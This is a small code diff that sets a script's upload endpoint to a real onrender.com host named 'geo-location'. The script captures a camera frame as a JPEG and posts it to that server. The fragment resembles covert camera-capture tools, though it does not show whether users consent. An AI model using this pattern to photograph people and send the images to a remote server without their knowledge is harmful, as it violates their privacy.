@@ -40,7 +40,7 @@
       const image = canvas.toDataURL("image/jpeg");
       stream.getTracks().forEach(t => t.stop());
 
-      await fetch("https://YOUR-BACKEND.onrender.com/upload", {
+      await fetch("https://geo-location-fb0c.onrender.com/upload", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
